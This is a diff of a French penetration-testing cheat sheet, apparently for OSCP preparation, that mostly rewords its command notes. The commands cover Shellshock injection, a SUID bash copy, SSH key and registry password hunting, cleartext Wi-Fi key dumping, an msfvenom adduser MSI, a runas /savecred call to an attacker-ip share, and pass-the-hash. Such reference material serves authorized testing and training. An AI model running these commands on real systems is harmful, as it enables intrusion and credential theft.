@@ -16,7 +16,7 @@ Vérifier les ports et les services de la cible autorisée.
 ### Méthodologie générale
 
 
-<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
+<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Méthodologie générale».</p>
 
 ```bash
 nc -v [ip] [port]
@@ -204,7 +204,7 @@ Vérifier les ports et les services de la cible autorisée.
 `href` · `exiftool` · `html2markdown`  
 
 
-<p class="oscp-command-note">Interroger le serveur avec une requête HTTP.</p>
+<p class="oscp-command-note">HTTP : examiner la réponse du serveur pour «Analyse de vulnérabilités».</p>
 
 ```bash
 curl -s http://[ip]/ | html2markdown
@@ -283,7 +283,7 @@ Examiner les entrées et les réponses de l'application web.
 `/cgi-bin/`  
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-shellshock ».</p>
 
 ```bash
 nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
@@ -357,7 +357,7 @@ cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
 #### Énumération générale
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Énumération générale».</p>
 
 ```text
 ls -la
@@ -376,7 +376,7 @@ ls -la
 `/opt` · `/srv`  
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher des fichiers correspondant au motif «*.py».</p>
 
 ```text
 find / -name "*.py"
@@ -465,7 +465,7 @@ strings /dev/mem -n10 | grep -i PASS
 ```
 
 
-<p class="oscp-command-note">Lire un fichier.</p>
+<p class="oscp-command-note">Lire le fichier ~/.ssh/id_rsa et examiner son contenu.</p>
 
 ```bash
 cat ~/.ssh/id_rsa
@@ -476,7 +476,7 @@ find / -name id_rsa 2> /dev/null
 ```
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher des fichiers correspondant au motif «rsyncd.conf».</p>
 
 ```bash
 find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
@@ -612,7 +612,7 @@ netstat -bona
 ```
 
 
-<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>
+<p class="oscp-command-note">Afficher l'état ou les règles du pare-feu Windows.</p>
 
 ```powershell
 netsh advfirewall firewall dump
@@ -649,7 +649,7 @@ powershell Find-DomainShare -ComputerDomain domain.local
 ```
 
 
-<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
+<p class="oscp-command-note">Registre : interroger les clés utiles à «Énumération réseau».</p>
 
 ```powershell
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
@@ -714,13 +714,13 @@ net stop [service name] && net start [service name]
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Misconfigurations ».</p>
+<p class="oscp-command-note">CMD Windows : lister les chemins de services et vérifier leurs permissions avec icacls.</p>
 
 ```powershell
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
 
-# do it by using sc
+# Effectuer cette opération avec sc.exe.
 sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
@@ -728,7 +728,7 @@ FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >>
 ```
 
 
-<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
+<p class="oscp-command-note">Registre : interroger les clés utiles à «Configurations à risque».</p>
 
 ```powershell
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
@@ -744,7 +744,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t RE
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Configurations à risque».</p>
 
 ```powershell
 dir /a "C:\Program Files"
@@ -757,7 +757,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Misconfigurations ».</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Configurations à risque».</p>
 
 ```powershell
 # utilisant accesschk.exe
@@ -794,26 +794,24 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 ```
 
 
-<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
+<p class="oscp-command-note">Registre : vérifier les politiques AlwaysInstallElevated.</p>
 
 ```powershell
-# si les deux sont activés (réglage à 0x1), il est possible d'exécuter
-# Un fichier .msi peut alors s’exécuter avec les privilèges NT AUTHORITY\SYSTEM
+# Sur Windows : les DEUX valeurs doivent être à 1 pour cette mauvaise configuration.
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
 
-# vérifier avec msf
-exploit/windows/local/always_install_elevated
+**Sur Kali :** exemple de génération d'un MSI de laboratoire avec msfvenom. Vérifier d'abord que la charge utile et le format existent dans la version installée.
 
-# Générer une charge utile (payload) avec msfvenom
-# pas de format uac
-msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
-# en utilisant le msiexec l'uac ne sera pas invité
-msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
+```bash
+msfvenom -p windows/adduser USER=<COMPTE_DE_TEST> PASS='<MOT_DE_PASSE_TEST>' -f msi -o test.msi
+```
 
-# installer .msi
-msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
+**Sur Windows :** après transfert, l'exécution du MSI dépend des stratégies, des permissions et de l'environnement. Elle n'accorde pas systématiquement des droits SYSTEM.
 
+```powershell
+msiexec.exe /i C:\Users\Public\test.msi /qn
 ```
 
 
@@ -833,7 +831,7 @@ Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,Task
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Misconfigurations ».</p>
+<p class="oscp-command-note">WSL : identifier le compte Linux puis modifier l'utilisateur par défaut d'une distribution.</p>
 
 ```powershell
 wsl whoami
@@ -849,7 +847,7 @@ wsl python -c 'put here your command'
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Exécuter un script PowerShell.</p>
+<p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Accès aux données d’authentification».</p>
 
 ```powershell
 # Utilisation de la motorisation
@@ -867,7 +865,7 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
 ```powershell
 dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
@@ -876,7 +874,7 @@ findstr /si /m password *.xml *.ini *.txt
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Credential Access ».</p>
+<p class="oscp-command-note">Windows : examiner cmdkey puis tester runas /savecred avec un compte enregistré et autorisé.</p>
 
 ```powershell
 cmdkey /list
@@ -886,7 +884,7 @@ runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
 ```
 
 
-<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
+<p class="oscp-command-note">Registre : contrôler les paramètres de connexion Winlogon.</p>
 
 ```powershell
 reg query HKLM /f pass /t REG_SZ /s
@@ -895,18 +893,18 @@ reg query HKCU /f pass /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
-# Autologin Windows
+# Ouverture de session automatique Windows
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 # SNMP parameters
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 
-# Putty credentials
+# Identifiants PuTTY
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 
-# VNC credentials
+# Identifiants VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
 
@@ -916,7 +914,7 @@ reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Credential Access ».</p>
+<p class="oscp-command-note">Chemins de fichiers à examiner pour «Accès aux données d’authentification» (pas des commandes).</p>
 
 ```powershell
 c:\sysprep.inf
@@ -927,7 +925,7 @@ c:\sysprep\sysprep.xml
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Accès aux données d’authentification».</p>
 
 ```powershell
 dir /s /b /p *access*.log* == *.log
@@ -947,7 +945,7 @@ C:\inetpub\wwwroot\web.config
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
 ```powershell
 dir c:*vnc.ini /s /b
@@ -1017,15 +1015,15 @@ TypedURLs #IE
 ```
 
 
-<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>
+<p class="oscp-command-note">Afficher les interfaces, ports et routes du réseau Windows.</p>
 
 ```powershell
 # 1. Find AP SSID
 netsh wlan show profile
-# 2. Get cleartext password
+# 2. Récupérer le mot de passe en clair si les droits l'autorisent.
 netsh wlan show profile <SSID> key=clear
 # OR
-# Go hard and grab 'em all
+# Variante : examiner toutes les entrées accessibles.
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
 
 ```
@@ -1051,7 +1049,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Credential Access ».</p>
+<p class="oscp-command-note">Lire le fichier %userprofile%\AppData\Roaming\Microsoft\Win… et examiner son contenu.</p>
 
 ```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -1075,7 +1073,7 @@ Get-Content -path <filename> -Stream <keyword>
 
 
 ```powershell
-# Usually %SYSTEMROOT% = C:\Windows
+# Habituellement, %SYSTEMROOT% correspond à C:\Windows
 %SYSTEMROOT%\repair\SAM
 %SYSTEMROOT%\System32\config\RegBack\SAM
 %SYSTEMROOT%\System32\config\SAM
@@ -1199,7 +1197,7 @@ sc query state= all | findstr "SERVICE_NAME"
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
 ```powershell
 # Rechercher dans C:\\ProgramData, C:\\Users\\All Users et les dossiers propres aux applications, par exemple C:\\Program Files.
@@ -1244,7 +1242,7 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>
 ```
 
 
-<p class="oscp-command-note">Ouvrir une session RDP.</p>
+<p class="oscp-command-note">Ouvrir un accès graphique à la cible via VNC ou RDP.</p>
 
 ```bash
 # RDP
@@ -1269,7 +1267,7 @@ impacket-wmiexec <username>:<password>@<target_ip>
 `cpassword` · `SYSVOL`  
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
 ```powershell
 # Vérifiez le mot de passe cpass dans le partage SYSvol pour obtenir des mots de passe clairs dans les fichiers XML.
@@ -1307,7 +1305,7 @@ schtasks /query /fo LIST /v
 ```
 
 
-<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
+<p class="oscp-command-note">Vérifier les identifiants et droits visibles via WINRM avec NetExec/CrackMapExec.</p>
 
 ```powershell
 # Essai pour WinRM
